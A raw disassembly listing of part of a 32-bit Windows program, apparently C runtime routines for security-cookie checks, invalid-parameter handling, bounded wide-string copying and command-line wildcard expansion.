  404534:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  40453a:	8d 45 04             	lea    0x4(%ebp),%eax
  40453d:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  404543:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  40454a:	00 01 00 
  40454d:	8b 40 fc             	mov    -0x4(%eax),%eax
  404550:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  404556:	8b 45 0c             	mov    0xc(%ebp),%eax
  404559:	89 85 e0 fc ff ff    	mov    %eax,-0x320(%ebp)
  40455f:	8b 45 10             	mov    0x10(%ebp),%eax
  404562:	89 85 e4 fc ff ff    	mov    %eax,-0x31c(%ebp)
  404568:	8b 45 04             	mov    0x4(%ebp),%eax
  40456b:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  404571:	ff 15 98 c0 40 00    	call   *0x40c098
  404577:	6a 00                	push   $0x0
  404579:	8b f8                	mov    %eax,%edi
  40457b:	ff 15 78 c0 40 00    	call   *0x40c078
  404581:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  404587:	50                   	push   %eax
  404588:	ff 15 74 c0 40 00    	call   *0x40c074
  40458e:	85 c0                	test   %eax,%eax
  404590:	75 13                	jne    0x4045a5
  404592:	85 ff                	test   %edi,%edi
  404594:	75 0f                	jne    0x4045a5
  404596:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40459a:	74 09                	je     0x4045a5
  40459c:	ff 75 08             	push   0x8(%ebp)
  40459f:	e8 04 db ff ff       	call   0x4020a8
  4045a4:	59                   	pop    %ecx
  4045a5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4045a8:	33 cd                	xor    %ebp,%ecx
  4045aa:	5f                   	pop    %edi
  4045ab:	e8 18 d2 ff ff       	call   0x4017c8
  4045b0:	8b e5                	mov    %ebp,%esp
  4045b2:	5d                   	pop    %ebp
  4045b3:	c3                   	ret
  4045b4:	8b ff                	mov    %edi,%edi
  4045b6:	55                   	push   %ebp
  4045b7:	8b ec                	mov    %esp,%ebp
  4045b9:	ff 75 08             	push   0x8(%ebp)
  4045bc:	b9 f8 3d 41 00       	mov    $0x413df8,%ecx
  4045c1:	e8 2d 23 00 00       	call   0x4068f3
  4045c6:	5d                   	pop    %ebp
  4045c7:	c3                   	ret
  4045c8:	8b ff                	mov    %edi,%edi
  4045ca:	55                   	push   %ebp
  4045cb:	8b ec                	mov    %esp,%ebp
  4045cd:	51                   	push   %ecx
  4045ce:	a1 04 30 41 00       	mov    0x413004,%eax
  4045d3:	33 c5                	xor    %ebp,%eax
  4045d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4045d8:	56                   	push   %esi
  4045d9:	e8 d0 fd ff ff       	call   0x4043ae
  4045de:	85 c0                	test   %eax,%eax
  4045e0:	74 35                	je     0x404617
  4045e2:	8b b0 5c 03 00 00    	mov    0x35c(%eax),%esi
  4045e8:	85 f6                	test   %esi,%esi
  4045ea:	74 2b                	je     0x404617
  4045ec:	ff 75 18             	push   0x18(%ebp)
  4045ef:	ff 75 14             	push   0x14(%ebp)
  4045f2:	ff 75 10             	push   0x10(%ebp)
  4045f5:	ff 75 0c             	push   0xc(%ebp)
  4045f8:	ff 75 08             	push   0x8(%ebp)
  4045fb:	8b ce                	mov    %esi,%ecx
  4045fd:	ff 15 60 c1 40 00    	call   *0x40c160
  404603:	ff d6                	call   *%esi
  404605:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404608:	83 c4 14             	add    $0x14,%esp
  40460b:	33 cd                	xor    %ebp,%ecx
  40460d:	5e                   	pop    %esi
  40460e:	e8 b5 d1 ff ff       	call   0x4017c8
  404613:	8b e5                	mov    %ebp,%esp
  404615:	5d                   	pop    %ebp
  404616:	c3                   	ret
  404617:	ff 75 18             	push   0x18(%ebp)
  40461a:	8b 35 04 30 41 00    	mov    0x413004,%esi
  404620:	8b ce                	mov    %esi,%ecx
  404622:	ff 75 14             	push   0x14(%ebp)
  404625:	33 35 f8 3d 41 00    	xor    0x413df8,%esi
  40462b:	83 e1 1f             	and    $0x1f,%ecx
  40462e:	ff 75 10             	push   0x10(%ebp)
  404631:	d3 ce                	ror    %cl,%esi
  404633:	ff 75 0c             	push   0xc(%ebp)
  404636:	ff 75 08             	push   0x8(%ebp)
  404639:	85 f6                	test   %esi,%esi
  40463b:	75 be                	jne    0x4045fb
  40463d:	e8 11 00 00 00       	call   0x404653
  404642:	cc                   	int3
  404643:	33 c0                	xor    %eax,%eax
  404645:	50                   	push   %eax
  404646:	50                   	push   %eax
  404647:	50                   	push   %eax
  404648:	50                   	push   %eax
  404649:	50                   	push   %eax
  40464a:	e8 79 ff ff ff       	call   0x4045c8
  40464f:	83 c4 14             	add    $0x14,%esp
  404652:	c3                   	ret
  404653:	6a 17                	push   $0x17
  404655:	e8 52 62 00 00       	call   0x40a8ac
  40465a:	85 c0                	test   %eax,%eax
  40465c:	74 05                	je     0x404663
  40465e:	6a 05                	push   $0x5
  404660:	59                   	pop    %ecx
  404661:	cd 29                	int    $0x29
  404663:	56                   	push   %esi
  404664:	6a 01                	push   $0x1
  404666:	be 17 04 00 c0       	mov    $0xc0000417,%esi
  40466b:	56                   	push   %esi
  40466c:	6a 02                	push   $0x2
  40466e:	e8 06 fe ff ff       	call   0x404479
  404673:	83 c4 0c             	add    $0xc,%esp
  404676:	56                   	push   %esi
  404677:	ff 15 2c c0 40 00    	call   *0x40c02c
  40467d:	50                   	push   %eax
  40467e:	ff 15 7c c0 40 00    	call   *0x40c07c
  404684:	5e                   	pop    %esi
  404685:	c3                   	ret
  404686:	8b ff                	mov    %edi,%edi
  404688:	55                   	push   %ebp
  404689:	8b ec                	mov    %esp,%ebp
  40468b:	8b 55 08             	mov    0x8(%ebp),%edx
  40468e:	56                   	push   %esi
  40468f:	85 d2                	test   %edx,%edx
  404691:	74 13                	je     0x4046a6
  404693:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404696:	85 c9                	test   %ecx,%ecx
  404698:	74 0c                	je     0x4046a6
  40469a:	8b 75 10             	mov    0x10(%ebp),%esi
  40469d:	85 f6                	test   %esi,%esi
  40469f:	75 19                	jne    0x4046ba
  4046a1:	33 c0                	xor    %eax,%eax
  4046a3:	66 89 02             	mov    %ax,(%edx)
  4046a6:	e8 90 01 00 00       	call   0x40483b
  4046ab:	6a 16                	push   $0x16
  4046ad:	5e                   	pop    %esi
  4046ae:	89 30                	mov    %esi,(%eax)
  4046b0:	e8 8e ff ff ff       	call   0x404643
  4046b5:	8b c6                	mov    %esi,%eax
  4046b7:	5e                   	pop    %esi
  4046b8:	5d                   	pop    %ebp
  4046b9:	c3                   	ret
  4046ba:	57                   	push   %edi
  4046bb:	8b fa                	mov    %edx,%edi
  4046bd:	2b f2                	sub    %edx,%esi
  4046bf:	0f b7 04 3e          	movzwl (%esi,%edi,1),%eax
  4046c3:	66 89 07             	mov    %ax,(%edi)
  4046c6:	8d 7f 02             	lea    0x2(%edi),%edi
  4046c9:	66 85 c0             	test   %ax,%ax
  4046cc:	74 05                	je     0x4046d3
  4046ce:	83 e9 01             	sub    $0x1,%ecx
  4046d1:	75 ec                	jne    0x4046bf
  4046d3:	5f                   	pop    %edi
  4046d4:	85 c9                	test   %ecx,%ecx
  4046d6:	75 0e                	jne    0x4046e6
  4046d8:	33 c0                	xor    %eax,%eax
  4046da:	66 89 02             	mov    %ax,(%edx)
  4046dd:	e8 59 01 00 00       	call   0x40483b
  4046e2:	6a 22                	push   $0x22
  4046e4:	eb c7                	jmp    0x4046ad
  4046e6:	33 f6                	xor    %esi,%esi
  4046e8:	eb cb                	jmp    0x4046b5
  4046ea:	8b ff                	mov    %edi,%edi
  4046ec:	55                   	push   %ebp
  4046ed:	8b ec                	mov    %esp,%ebp
  4046ef:	51                   	push   %ecx
  4046f0:	8b 55 14             	mov    0x14(%ebp),%edx
  4046f3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4046f6:	56                   	push   %esi
  4046f7:	85 d2                	test   %edx,%edx
  4046f9:	75 0d                	jne    0x404708
  4046fb:	85 c9                	test   %ecx,%ecx
  4046fd:	75 0d                	jne    0x40470c
  4046ff:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  404702:	75 26                	jne    0x40472a
  404704:	33 c0                	xor    %eax,%eax
  404706:	eb 33                	jmp    0x40473b
  404708:	85 c9                	test   %ecx,%ecx
  40470a:	74 1e                	je     0x40472a
  40470c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40470f:	85 c0                	test   %eax,%eax
  404711:	74 17                	je     0x40472a
  404713:	85 d2                	test   %edx,%edx
  404715:	75 07                	jne    0x40471e
  404717:	33 c0                	xor    %eax,%eax
  404719:	66 89 01             	mov    %ax,(%ecx)
  40471c:	eb e6                	jmp    0x404704
  40471e:	8b 75 10             	mov    0x10(%ebp),%esi
  404721:	85 f6                	test   %esi,%esi
  404723:	75 1b                	jne    0x404740
  404725:	33 c0                	xor    %eax,%eax
  404727:	66 89 01             	mov    %ax,(%ecx)
  40472a:	e8 0c 01 00 00       	call   0x40483b
  40472f:	6a 16                	push   $0x16
  404731:	5e                   	pop    %esi
  404732:	89 30                	mov    %esi,(%eax)
  404734:	e8 0a ff ff ff       	call   0x404643
  404739:	8b c6                	mov    %esi,%eax
  40473b:	5e                   	pop    %esi
  40473c:	8b e5                	mov    %ebp,%esp
  40473e:	5d                   	pop    %ebp
  40473f:	c3                   	ret
  404740:	53                   	push   %ebx
  404741:	2b f1                	sub    %ecx,%esi
  404743:	8b d8                	mov    %eax,%ebx
  404745:	57                   	push   %edi
  404746:	8b f9                	mov    %ecx,%edi
  404748:	83 fa ff             	cmp    $0xffffffff,%edx
  40474b:	75 16                	jne    0x404763
  40474d:	0f b7 04 3e          	movzwl (%esi,%edi,1),%eax
  404751:	66 89 07             	mov    %ax,(%edi)
  404754:	8d 7f 02             	lea    0x2(%edi),%edi
  404757:	66 85 c0             	test   %ax,%ax
  40475a:	74 2c                	je     0x404788
  40475c:	83 eb 01             	sub    $0x1,%ebx
  40475f:	75 ec                	jne    0x40474d
  404761:	eb 25                	jmp    0x404788
  404763:	0f b7 04 3e          	movzwl (%esi,%edi,1),%eax
  404767:	66 89 07             	mov    %ax,(%edi)
  40476a:	8d 7f 02             	lea    0x2(%edi),%edi
  40476d:	66 85 c0             	test   %ax,%ax
  404770:	74 0a                	je     0x40477c
  404772:	83 eb 01             	sub    $0x1,%ebx
  404775:	74 05                	je     0x40477c
  404777:	83 ea 01             	sub    $0x1,%edx
  40477a:	75 e7                	jne    0x404763
  40477c:	85 d2                	test   %edx,%edx
  40477e:	8b 55 14             	mov    0x14(%ebp),%edx
  404781:	75 05                	jne    0x404788
  404783:	33 c0                	xor    %eax,%eax
  404785:	66 89 07             	mov    %ax,(%edi)
  404788:	5f                   	pop    %edi
  404789:	85 db                	test   %ebx,%ebx
  40478b:	5b                   	pop    %ebx
  40478c:	0f 85 72 ff ff ff    	jne    0x404704
  404792:	83 fa ff             	cmp    $0xffffffff,%edx
  404795:	75 0f                	jne    0x4047a6
  404797:	8b 45 0c             	mov    0xc(%ebp),%eax
  40479a:	33 d2                	xor    %edx,%edx
  40479c:	6a 50                	push   $0x50
  40479e:	66 89 54 41 fe       	mov    %dx,-0x2(%ecx,%eax,2)
  4047a3:	58                   	pop    %eax
  4047a4:	eb 95                	jmp    0x40473b
  4047a6:	33 c0                	xor    %eax,%eax
  4047a8:	66 89 01             	mov    %ax,(%ecx)
  4047ab:	e8 8b 00 00 00       	call   0x40483b
  4047b0:	6a 22                	push   $0x22
  4047b2:	e9 7a ff ff ff       	jmp    0x404731
  4047b7:	8b ff                	mov    %edi,%edi
  4047b9:	55                   	push   %ebp
  4047ba:	8b ec                	mov    %esp,%ebp
  4047bc:	5d                   	pop    %ebp
  4047bd:	e9 28 ff ff ff       	jmp    0x4046ea
  4047c2:	8b ff                	mov    %edi,%edi
  4047c4:	55                   	push   %ebp
  4047c5:	8b ec                	mov    %esp,%ebp
  4047c7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047ca:	33 c0                	xor    %eax,%eax
  4047cc:	3b 0c c5 70 cb 40 00 	cmp    0x40cb70(,%eax,8),%ecx
  4047d3:	74 27                	je     0x4047fc
  4047d5:	40                   	inc    %eax
  4047d6:	83 f8 2d             	cmp    $0x2d,%eax
  4047d9:	72 f1                	jb     0x4047cc
  4047db:	8d 41 ed             	lea    -0x13(%ecx),%eax
  4047de:	83 f8 11             	cmp    $0x11,%eax
  4047e1:	77 05                	ja     0x4047e8
  4047e3:	6a 0d                	push   $0xd
  4047e5:	58                   	pop    %eax
  4047e6:	5d                   	pop    %ebp
  4047e7:	c3                   	ret
  4047e8:	8d 81 44 ff ff ff    	lea    -0xbc(%ecx),%eax
  4047ee:	6a 0e                	push   $0xe
  4047f0:	59                   	pop    %ecx
  4047f1:	3b c8                	cmp    %eax,%ecx
  4047f3:	1b c0                	sbb    %eax,%eax
  4047f5:	23 c1                	and    %ecx,%eax
  4047f7:	83 c0 08             	add    $0x8,%eax
  4047fa:	5d                   	pop    %ebp
  4047fb:	c3                   	ret
  4047fc:	8b 04 c5 74 cb 40 00 	mov    0x40cb74(,%eax,8),%eax
  404803:	5d                   	pop    %ebp
  404804:	c3                   	ret
  404805:	8b ff                	mov    %edi,%edi
  404807:	55                   	push   %ebp
  404808:	8b ec                	mov    %esp,%ebp
  40480a:	56                   	push   %esi
  40480b:	e8 18 00 00 00       	call   0x404828
  404810:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404813:	51                   	push   %ecx
  404814:	89 08                	mov    %ecx,(%eax)
  404816:	e8 a7 ff ff ff       	call   0x4047c2
  40481b:	59                   	pop    %ecx
  40481c:	8b f0                	mov    %eax,%esi
  40481e:	e8 18 00 00 00       	call   0x40483b
  404823:	89 30                	mov    %esi,(%eax)
  404825:	5e                   	pop    %esi
  404826:	5d                   	pop    %ebp
  404827:	c3                   	ret
  404828:	e8 81 fb ff ff       	call   0x4043ae
  40482d:	85 c0                	test   %eax,%eax
  40482f:	75 06                	jne    0x404837
  404831:	b8 4c 30 41 00       	mov    $0x41304c,%eax
  404836:	c3                   	ret
  404837:	83 c0 14             	add    $0x14,%eax
  40483a:	c3                   	ret
  40483b:	e8 6e fb ff ff       	call   0x4043ae
  404840:	85 c0                	test   %eax,%eax
  404842:	75 06                	jne    0x40484a
  404844:	b8 48 30 41 00       	mov    $0x413048,%eax
  404849:	c3                   	ret
  40484a:	83 c0 10             	add    $0x10,%eax
  40484d:	c3                   	ret
  40484e:	8b ff                	mov    %edi,%edi
  404850:	55                   	push   %ebp
  404851:	8b ec                	mov    %esp,%ebp
  404853:	8b 45 0c             	mov    0xc(%ebp),%eax
  404856:	3b 45 08             	cmp    0x8(%ebp),%eax
  404859:	76 05                	jbe    0x404860
  40485b:	83 c8 ff             	or     $0xffffffff,%eax
  40485e:	5d                   	pop    %ebp
  40485f:	c3                   	ret
  404860:	1b c0                	sbb    %eax,%eax
  404862:	f7 d8                	neg    %eax
  404864:	5d                   	pop    %ebp
  404865:	c3                   	ret
  404866:	8b ff                	mov    %edi,%edi
  404868:	55                   	push   %ebp
  404869:	8b ec                	mov    %esp,%ebp
  40486b:	83 ec 30             	sub    $0x30,%esp
  40486e:	a1 04 30 41 00       	mov    0x413004,%eax
  404873:	33 c5                	xor    %ebp,%eax
  404875:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404878:	8b 45 0c             	mov    0xc(%ebp),%eax
  40487b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40487e:	56                   	push   %esi
  40487f:	8b 75 08             	mov    0x8(%ebp),%esi
  404882:	85 c0                	test   %eax,%eax
  404884:	75 16                	jne    0x40489c
  404886:	e8 b0 ff ff ff       	call   0x40483b
  40488b:	6a 16                	push   $0x16
  40488d:	5e                   	pop    %esi
  40488e:	89 30                	mov    %esi,(%eax)
  404890:	e8 ae fd ff ff       	call   0x404643
  404895:	8b c6                	mov    %esi,%eax
  404897:	e9 7b 01 00 00       	jmp    0x404a17
  40489c:	33 c9                	xor    %ecx,%ecx
  40489e:	53                   	push   %ebx
  40489f:	57                   	push   %edi
  4048a0:	89 08                	mov    %ecx,(%eax)
  4048a2:	8b f9                	mov    %ecx,%edi
  4048a4:	8b d9                	mov    %ecx,%ebx
  4048a6:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4048a9:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4048ac:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4048af:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4048b2:	39 0e                	cmp    %ecx,(%esi)
  4048b4:	74 61                	je     0x404917
  4048b6:	6a 2a                	push   $0x2a
  4048b8:	58                   	pop    %eax
  4048b9:	66 89 45 f4          	mov    %ax,-0xc(%ebp)
  4048bd:	6a 3f                	push   $0x3f
  4048bf:	58                   	pop    %eax
  4048c0:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
  4048c4:	33 c0                	xor    %eax,%eax
  4048c6:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  4048ca:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4048cd:	50                   	push   %eax
  4048ce:	ff 36                	push   (%esi)
  4048d0:	e8 a8 19 00 00       	call   0x40627d
  4048d5:	59                   	pop    %ecx
  4048d6:	59                   	pop    %ecx
  4048d7:	85 c0                	test   %eax,%eax
  4048d9:	75 14                	jne    0x4048ef
  4048db:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4048de:	50                   	push   %eax
  4048df:	33 c0                	xor    %eax,%eax
  4048e1:	50                   	push   %eax
  4048e2:	50                   	push   %eax
  4048e3:	ff 36                	push   (%esi)
  4048e5:	e8 49 01 00 00       	call   0x404a33
  4048ea:	83 c4 10             	add    $0x10,%esp
  4048ed:	eb 0f                	jmp    0x4048fe
  4048ef:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4048f2:	51                   	push   %ecx
  4048f3:	50                   	push   %eax
  4048f4:	ff 36                	push   (%esi)
  4048f6:	e8 d6 01 00 00       	call   0x404ad1
  4048fb:	83 c4 0c             	add    $0xc,%esp
  4048fe:	8b f8                	mov    %eax,%edi
  404900:	85 ff                	test   %edi,%edi
  404902:	0f 85 03 01 00 00    	jne    0x404a0b
  404908:	83 c6 04             	add    $0x4,%esi
  40490b:	33 c9                	xor    %ecx,%ecx
  40490d:	39 0e                	cmp    %ecx,(%esi)
  40490f:	75 a5                	jne    0x4048b6
  404911:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  404914:	8b 7d d8             	mov    -0x28(%ebp),%edi
  404917:	8b c3                	mov    %ebx,%eax
  404919:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40491c:	2b c7                	sub    %edi,%eax
  40491e:	33 c9                	xor    %ecx,%ecx
  404920:	8b d0                	mov    %eax,%edx
  404922:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404925:	c1 fa 02             	sar    $0x2,%edx
  404928:	83 c0 03             	add    $0x3,%eax
  40492b:	42                   	inc    %edx
  40492c:	c1 e8 02             	shr    $0x2,%eax
  40492f:	3b df                	cmp    %edi,%ebx
  404931:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404934:	1b f6                	sbb    %esi,%esi
  404936:	f7 d6                	not    %esi
  404938:	23 f0                	and    %eax,%esi
  40493a:	74 38                	je     0x404974
  40493c:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  40493f:	8b d7                	mov    %edi,%edx
  404941:	8b 0a                	mov    (%edx),%ecx
  404943:	8d 41 02             	lea    0x2(%ecx),%eax
  404946:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404949:	66 8b 01             	mov    (%ecx),%ax
  40494c:	83 c1 02             	add    $0x2,%ecx
  40494f:	66 3b 45 e4          	cmp    -0x1c(%ebp),%ax
  404953:	75 f4                	jne    0x404949
  404955:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  404958:	43                   	inc    %ebx
  404959:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40495c:	83 c2 04             	add    $0x4,%edx
  40495f:	d1 f9                	sar    $1,%ecx
  404961:	03 d9                	add    %ecx,%ebx
  404963:	40                   	inc    %eax
  404964:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404967:	3b c6                	cmp    %esi,%eax
  404969:	75 d6                	jne    0x404941
  40496b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40496e:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  404971:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  404974:	6a 02                	push   $0x2
  404976:	ff 75 ec             	push   -0x14(%ebp)
  404979:	52                   	push   %edx
  40497a:	e8 c0 e7 ff ff       	call   0x40313f
  40497f:	8b f0                	mov    %eax,%esi
  404981:	83 c4 0c             	add    $0xc,%esp
  404984:	85 f6                	test   %esi,%esi
  404986:	75 05                	jne    0x40498d
  404988:	83 cf ff             	or     $0xffffffff,%edi
  40498b:	eb 77                	jmp    0x404a04
  40498d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404990:	8d 04 86             	lea    (%esi,%eax,4),%eax
  404993:	89 45 d0             	mov    %eax,-0x30(%ebp)
  404996:	8b d0                	mov    %eax,%edx
  404998:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40499b:	3b fb                	cmp    %ebx,%edi
  40499d:	74 5c                	je     0x4049fb
  40499f:	8b c6                	mov    %esi,%eax
  4049a1:	2b c7                	sub    %edi,%eax
  4049a3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4049a6:	8b 0f                	mov    (%edi),%ecx
  4049a8:	8d 41 02             	lea    0x2(%ecx),%eax
  4049ab:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4049ae:	66 8b 01             	mov    (%ecx),%ax
  4049b1:	83 c1 02             	add    $0x2,%ecx
  4049b4:	66 3b 45 e4          	cmp    -0x1c(%ebp),%ax
  4049b8:	75 f4                	jne    0x4049ae
  4049ba:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  4049bd:	d1 f9                	sar    $1,%ecx
  4049bf:	8d 41 01             	lea    0x1(%ecx),%eax
  4049c2:	8b ca                	mov    %edx,%ecx
  4049c4:	2b 4d d0             	sub    -0x30(%ebp),%ecx
  4049c7:	50                   	push   %eax
  4049c8:	ff 37                	push   (%edi)
  4049ca:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4049cd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049d0:	d1 f9                	sar    $1,%ecx
  4049d2:	2b c1                	sub    %ecx,%eax
  4049d4:	50                   	push   %eax
  4049d5:	52                   	push   %edx
  4049d6:	e8 dc fd ff ff       	call   0x4047b7
  4049db:	83 c4 10             	add    $0x10,%esp
  4049de:	85 c0                	test   %eax,%eax
  4049e0:	75 44                	jne    0x404a26
  4049e2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4049e5:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4049e8:	89 14 38             	mov    %edx,(%eax,%edi,1)
  4049eb:	83 c7 04             	add    $0x4,%edi
  4049ee:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4049f1:	8d 14 42             	lea    (%edx,%eax,2),%edx
  4049f4:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4049f7:	3b fb                	cmp    %ebx,%edi
  4049f9:	75 ab                	jne    0x4049a6
  4049fb:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4049fe:	89 30                	mov    %esi,(%eax)
  404a00:	33 c0                	xor    %eax,%eax
  404a02:	8b f8                	mov    %eax,%edi
  404a04:	50                   	push   %eax
  404a05:	e8 03 f4 ff ff       	call   0x403e0d
  404a0a:	59                   	pop    %ecx
  404a0b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404a0e:	e8 74 02 00 00       	call   0x404c87
  404a13:	8b c7                	mov    %edi,%eax
  404a15:	5f                   	pop    %edi
  404a16:	5b                   	pop    %ebx
  404a17:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404a1a:	33 cd                	xor    %ebp,%ecx
  404a1c:	5e                   	pop    %esi
  404a1d:	e8 a6 cd ff ff       	call   0x4017c8
  404a22:	8b e5                	mov    %ebp,%esp
  404a24:	5d                   	pop    %ebp
  404a25:	c3                   	ret
  404a26:	33 c0                	xor    %eax,%eax
  404a28:	50                   	push   %eax
  404a29:	50                   	push   %eax
  404a2a:	50                   	push   %eax
  404a2b:	50                   	push   %eax
  404a2c:	50                   	push   %eax
  404a2d:	e8 21 fc ff ff       	call   0x404653
  404a32:	cc                   	int3
  404a33:	8b ff                	mov    %edi,%edi
  404a35:	55                   	push   %ebp
  404a36:	8b ec                	mov    %esp,%ebp
  404a38:	51                   	push   %ecx
  404a39:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a3c:	53                   	push   %ebx
  404a3d:	57                   	push   %edi
  404a3e:	33 db                	xor    %ebx,%ebx
  404a40:	8d 51 02             	lea    0x2(%ecx),%edx
  404a43:	66 8b 01             	mov    (%ecx),%ax
  404a46:	83 c1 02             	add    $0x2,%ecx
  404a49:	66 3b c3             	cmp    %bx,%ax
  404a4c:	75 f5                	jne    0x404a43
  404a4e:	8b 7d 10             	mov    0x10(%ebp),%edi
  404a51:	2b ca                	sub    %edx,%ecx
  404a53:	d1 f9                	sar    $1,%ecx
  404a55:	83 c8 ff             	or     $0xffffffff,%eax
  404a58:	41                   	inc    %ecx
  404a59:	2b c7                	sub    %edi,%eax
  404a5b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404a5e:	3b c8                	cmp    %eax,%ecx
  404a60:	76 05                	jbe    0x404a67
  404a62:	6a 0c                	push   $0xc
  404a64:	58                   	pop    %eax
  404a65:	eb 57                	jmp    0x404abe
  404a67:	56                   	push   %esi
  404a68:	8d 5f 01             	lea    0x1(%edi),%ebx
  404a6b:	03 d9                	add    %ecx,%ebx
  404a6d:	6a 02                	push   $0x2
  404a6f:	53                   	push   %ebx
  404a70:	e8 63 f4 ff ff       	call   0x403ed8
  404a75:	8b f0                	mov    %eax,%esi
  404a77:	59                   	pop    %ecx
  404a78:	59                   	pop    %ecx
  404a79:	85 ff                	test   %edi,%edi
  404a7b:	74 12                	je     0x404a8f
  404a7d:	57                   	push   %edi
  404a7e:	ff 75 0c             	push   0xc(%ebp)
  404a81:	53                   	push   %ebx
  404a82:	56                   	push   %esi
  404a83:	e8 2f fd ff ff       	call   0x4047b7
  404a88:	83 c4 10             	add    $0x10,%esp
  404a8b:	85 c0                	test   %eax,%eax
  404a8d:	75 35                	jne    0x404ac4
  404a8f:	ff 75 fc             	push   -0x4(%ebp)
  404a92:	2b df                	sub    %edi,%ebx
  404a94:	8d 04 7e             	lea    (%esi,%edi,2),%eax
  404a97:	ff 75 08             	push   0x8(%ebp)
  404a9a:	53                   	push   %ebx
  404a9b:	50                   	push   %eax
  404a9c:	e8 16 fd ff ff       	call   0x4047b7
  404aa1:	83 c4 10             	add    $0x10,%esp
  404aa4:	85 c0                	test   %eax,%eax
  404aa6:	75 1c                	jne    0x404ac4
  404aa8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404aab:	56                   	push   %esi
  404aac:	e8 fb 01 00 00       	call   0x404cac
  404ab1:	6a 00                	push   $0x0
  404ab3:	8b f0                	mov    %eax,%esi
  404ab5:	e8 53 f3 ff ff       	call   0x403e0d
  404aba:	59                   	pop    %ecx
  404abb:	8b c6                	mov    %esi,%eax
  404abd:	5e                   	pop    %esi
  404abe:	5f                   	pop    %edi
  404abf:	5b                   	pop    %ebx
  404ac0:	8b e5                	mov    %ebp,%esp
  404ac2:	5d                   	pop    %ebp
  404ac3:	c3                   	ret
  404ac4:	33 c0                	xor    %eax,%eax
  404ac6:	50                   	push   %eax
  404ac7:	50                   	push   %eax
  404ac8:	50                   	push   %eax
  404ac9:	50                   	push   %eax
  404aca:	50                   	push   %eax
  404acb:	e8 83 fb ff ff       	call   0x404653
  404ad0:	cc                   	int3
  404ad1:	8b ff                	mov    %edi,%edi
  404ad3:	55                   	push   %ebp
  404ad4:	8b ec                	mov    %esp,%ebp
  404ad6:	81 ec 60 02 00 00    	sub    $0x260,%esp
  404adc:	a1 04 30 41 00       	mov    0x413004,%eax
  404ae1:	33 c5                	xor    %ebp,%eax
  404ae3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ae6:	8b 55 10             	mov    0x10(%ebp),%edx
  404ae9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404aec:	53                   	push   %ebx
  404aed:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404af0:	56                   	push   %esi
  404af1:	57                   	push   %edi
  404af2:	6a 5c                	push   $0x5c
  404af4:	5e                   	pop    %esi
  404af5:	6a 3a                	push   $0x3a
  404af7:	89 95 a8 fd ff ff    	mov    %edx,-0x258(%ebp)
  404afd:	c7 85 a4 fd ff ff 2f 	movl   $0x2f,-0x25c(%ebp)
  404b04:	00 00 00 
  404b07:	5f                   	pop    %edi
  404b08:	eb 19                	jmp    0x404b23
  404b0a:	0f b7 01             	movzwl (%ecx),%eax
  404b0d:	66 3b 85 a4 fd ff ff 	cmp    -0x25c(%ebp),%ax
  404b14:	74 11                	je     0x404b27
  404b16:	66 3b c6             	cmp    %si,%ax
  404b19:	74 0c                	je     0x404b27
  404b1b:	66 3b c7             	cmp    %di,%ax
  404b1e:	74 07                	je     0x404b27
  404b20:	83 e9 02             	sub    $0x2,%ecx
  404b23:	3b cb                	cmp    %ebx,%ecx
  404b25:	75 e3                	jne    0x404b0a
  404b27:	0f b7 31             	movzwl (%ecx),%esi
  404b2a:	66 3b f7             	cmp    %di,%si
  404b2d:	75 1a                	jne    0x404b49
